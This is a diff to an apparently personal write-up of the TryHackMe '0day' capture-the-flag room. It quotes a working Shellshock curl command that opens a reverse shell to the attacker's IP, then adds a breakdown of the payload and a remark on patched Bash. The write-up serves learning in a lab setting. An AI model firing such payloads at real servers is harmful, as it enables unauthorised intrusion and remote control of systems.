@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:29:13.764+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:40:42.669+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
 ---
 
 
@@ -142,6 +142,25 @@ nc -nvlp 4444
 curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.225.98/4444 0>&1" http://10.81.145.65/cgi-bin/test.cgi
 ```
 
+**Breakdown of the Shellshock Payload**
+
+```
+* curl makes the HTTP request
+* Sets a custom HTTP header
+* () defines a function
+* { :; }; defines an empty function - anything after ; is executed
+* /bin/bash -i spawns an interactive shell
+* >& redirects STDERR and STDOUT
+* /dev/tcp/IP/PORT The TCP connection 
+* redirect STDIN to STDOUT - making it interactive
+```
+
+> NOTE: For patched versions of BASH anything after { :;}; is **not** executed.
+> 
+> This exploit targets the vulnerable version of BASH on target machine.
+
+
+**Payload Success**
 ![](/img/user/Attachments/shelllshock-payload-connection-received.png)
 
 And it appears it is indeed vulnerable to the Shellshock vulnerability. A connection has been received by netcat.
@@ -156,7 +175,7 @@ Running the command above reveals a user **ryan**. Let's explore his home direct
 
 ![](/img/user/Attachments/user-flag.png)
 
-Sure enough it is indeed in his home directory. 
+Sure enough it is indeed in his home directory.  Now socat is not installed on the system 
 
 
 
